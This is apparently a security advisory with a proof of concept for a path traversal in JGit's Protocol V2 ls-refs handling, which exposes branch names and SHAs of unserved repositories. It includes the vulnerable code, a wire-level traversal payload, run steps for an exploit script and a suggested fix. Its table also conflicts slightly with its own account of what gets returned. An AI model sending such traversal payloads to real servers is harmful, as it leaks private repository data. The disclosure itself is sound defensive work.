# JGit — Branch Name Discovery in Secret Repos via `ls-refs ref-prefix` Path Traversal

**CVE status:** not yet assigned
**Affected component:** `org.eclipse.jgit` — `ProtocolV2Parser`, `RefDirectory$LooseScanner`
**Affected versions:** JGit ≤ 7.5.0.202512021534-r (latest stable as of 2026-02-18)
**Protocol:** Git Smart HTTP, Protocol V2
**Config required:** **None** — default JGit server configuration
**Authentication required:** No

---

## Impact

An unauthenticated HTTP client can enumerate **branch names**, **commit SHAs**, and the
**directory tree** of any git repository that shares a filesystem with the JGit HTTP server,
even if that repository is not served over HTTP.

**Scenario:** A git hosting server serves `/srv/git/public.git` over HTTP. The same server
stores `/srv/git/secret.git` on the same disk. An attacker with no credentials sends a
single HTTP request to the public endpoint and receives back the names and SHA-1 hashes of
every branch in `secret.git`.

No pack data, no authentication, no `allowRefInWant` flag — the branch names and SHAs
arrive in the plain HTTP 200 response body, ready for a subsequent targeted `git fetch`.

---

## Quick Start

```
# 1. Download dependencies and create the two-repo demo
bash start_server.sh setup

# 2. In a second terminal, start the JGit HTTP server (stays in foreground)
bash start_server.sh serve

# 3. In a third terminal, run the exploit
python3 exploit.py
```

`start_server.sh setup` creates:

```
/tmp/jgit-demo/
  public.git/        ← served over HTTP on port 7070 at /public.git
  secret.git/        ← NOT served; has branch "classified-feature"
```

The exploit output shows the branch name `classified-feature` and its commit SHA returned
from the public HTTP endpoint, having never been advertised by the server.

---

## How It Works

### Vulnerable code path

**1. `ProtocolV2Parser.parseLsRefsRequest()` — no ref name validation**

```java
// src/org/eclipse/jgit/transport/ProtocolV2Parser.java
} else if (line2.startsWith("ref-prefix ")) {
    prefixes.add(line2.substring("ref-prefix ".length()));
    //           ↑ raw client string appended, no isValidRefName() call
```

**2. `RefDirectory.LooseScanner.scan()` — builds a `File` from the raw prefix**

```java
// src/org/eclipse/jgit/internal/storage/file/RefDirectory.java
} else if (prefix.startsWith(R_REFS) && prefix.endsWith("/")) {
    File dir = new File(refsDir, prefix.substring(R_REFS.length()));
    //                  ↑ refsDir = $GIT_DIR/refs/
    //   prefix = "refs/heads/../../../../../../srv/git/secret.git/refs/"
    //   substring(5) = "heads/../../../../../../srv/git/secret.git/refs/"
    //   new File($GIT_DIR/refs, "heads/../../../../../../srv/git/secret.git/refs/")
    //   OS resolves at opendir() → /srv/git/secret.git/refs/   ✓
    scanTree(prefix, dir);
```

**3. `scanTree()` recurses the resolved directory and reads every file**

Every file whose content parses as a 40-character hex SHA-1 is returned to the client as a
ref entry in the `ls-refs` response, with the filename used as the "ref name" and the
file content used as the object ID.

### Why the existing `receive-pack` guard does not protect here

`ReceivePack.parseCommand()` correctly calls `Repository.isValidRefName()`, which rejects
`..` components. That guard is absent from both `parseLsRefsRequest()` and
`parseFetchRequest()` in `ProtocolV2Parser.java`.

### Wire-level proof

The attacker sends (pkt-line encoding omitted for readability):

```
command=ls-refs
0001
ref-prefix refs/heads/../../../../../../srv/git/secret.git/refs/
0000
```

The `ref-prefix` value starts with `"refs/"` and ends with `"/"`, so it passes the
`LooseScanner` gate. The OS resolves the `../` sequences at `opendir()` time and the
scanner walks `/srv/git/secret.git/refs/` instead of the public repo's refs directory.

The HTTP 200 response contains entries like:

```
a3f8c1d… refs/heads/../../../../../../srv/git/secret.git/refs/heads/classified-feature
```

The SHA `a3f8c1d…` is the actual commit SHA of `classified-feature` in `secret.git`.
An attacker can now `git fetch <public-url> a3f8c1d…` to attempt to retrieve the objects
(succeeds if the objects are accessible to the server process).

---

## Missing Security Control

`Repository.isValidRefName()` already exists and correctly rejects any name containing
`..`, control characters, and other invalid patterns. It is called in the receive-pack
write path but **not** in the Protocol V2 upload-pack read path.

### Suggested one-line fix in `ProtocolV2Parser.parseLsRefsRequest()`

```java
} else if (line2.startsWith("ref-prefix ")) {
    String prefix = line2.substring("ref-prefix ".length());
    // Validate: strip trailing "/" before checking (prefix may legally end with "/")
    String check = prefix.endsWith("/") ? prefix.substring(0, prefix.length() - 1) : prefix;
    if (!check.isEmpty() && !Repository.isValidRefName(check)) {
        throw new PackProtocolException("invalid ref-prefix: " + prefix);
    }
    prefixes.add(prefix);
```

`Repository.isValidRefName()` returns `false` for any string containing `..`, so the
traversal prefix is rejected before it reaches `LooseScanner`.

---

## Comparison: What a Normal `ls-refs` Returns

A normal client sending `ls-refs` with `ref-prefix refs/heads/` only receives refs stored
under `$GIT_DIR/refs/heads/` — files like `HEAD`, `FETCH_HEAD`, `ORIG_HEAD`, and refs
from other repositories are never visible.

| Request | Result |
|---|---|
| `ref-prefix refs/heads/` (normal) | Only `public.git` branches |
| `ref-prefix refs/heads/../../../../../../srv/git/secret.git/refs/` | All branches of `secret.git` |
| `ref-prefix refs/heads/../../` | `FETCH_HEAD`, `HEAD`, `config`, all of `$GIT_DIR/` |
